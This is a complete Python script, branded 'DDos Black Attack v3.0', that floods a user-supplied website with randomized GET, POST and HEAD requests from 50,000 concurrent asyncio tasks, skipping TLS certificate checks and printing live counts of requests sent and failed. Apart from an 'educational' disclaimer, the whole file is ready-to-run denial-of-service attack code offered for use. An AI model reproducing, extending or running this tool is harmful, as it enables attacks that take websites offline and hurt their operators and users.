# DDos Black Attack v3.0
# Developer: Safwan Al-Sadaf
# Date: 2025-06-17
# Description: Educational HTTP Flooder Tool with 50,000 threads and live counter
# Disclaimer: This tool is created for educational and testing purposes only.
# The developer is not responsible for any misuse of this script.

import asyncio
import random
import ssl
import sys
import os
from aiohttp import ClientSession, TCPConnector
from urllib.parse import urlparse, quote

class DDosBlackAttack:
    def __init__(self):
        self.target_url = ""
        self.host_ip = ""
        self.threads = 50000
        self.running = True
        self.methods = ['GET', 'POST', 'HEAD']
        self.ssl_ctx = self.create_ssl_context()
        self.success = 0
        self.failed = 0

    def create_ssl_context(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def clear_screen(self):
        os.system('clear' if os.name != 'nt' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(r"""
 ____         __                     
/ ___|  __ _ / _|_      ____ _ _ __  
\___ \ / _` | |_\ \ /\ / / _` | '_ \ 
 ___) | (_| |  _|\ V  V / (_| | | | |
|____/ \__,_|_|   \_/\_/ \__,_|_| |_|

        DDos Black Attack v3.0
        Developer: Safwan Al-Sadaf
        Mode: Random HTTP Flood (GET/POST/HEAD)
        Threads: 50,000
---------------------------------------------------
"Use responsibly. Only on permitted websites."
---------------------------------------------------
""")

    def setup(self):
        self.show_banner()
        self.target_url = input("[+] Enter target website URL (https://example.com): ").strip()
        self.host_ip = input("[+] Enter target host IP address: ").strip()

    def generate_junk(self):
        return quote(f"_={random.randint(10000, 999999)}&data={random.random()}")

    def generate_headers(self):
        return {
            "Host": urlparse(self.target_url).netloc,
            "User-Agent": f"Mozilla/5.0 (DDosBlackAttack/{random.randint(1000,9999)})",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

    async def http_flood(self, session, method):
        while self.running:
            try:
                url = f"{self.target_url}?{self.generate_junk()}"
                async with session.request(method=method, url=url, ssl=self.ssl_ctx, timeout=10) as response:
                    await response.read()
                    self.success += 1
            except:
                self.failed += 1

    async def attack_loop(self):
        connector = TCPConnector(ssl=self.ssl_ctx, limit=self.threads)
        tasks = []
        async with ClientSession(connector=connector, headers=self.generate_headers()) as session:
            for _ in range(self.threads):
                method = random.choice(self.methods)
                tasks.append(self.http_flood(session, method))
            stat_task = asyncio.create_task(self.show_stats())
            await asyncio.gather(*tasks, stat_task)

    async def show_stats(self):
        while self.running:
            await asyncio.sleep(1)
            print(f"[+] Sent: {self.success} | Failed: {self.failed}", end='\r')

    def run(self):
        self.setup()
        print("\n[✓] Attack Started! Live stats below... (Ctrl+C to stop)\n")
        try:
            asyncio.run(self.attack_loop())
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Attack Stopped by user.")
        print("\n[✓] Attack Finished ✅")

if __name__ == "__main__":
    tool = DDosBlackAttack()
    tool.run()
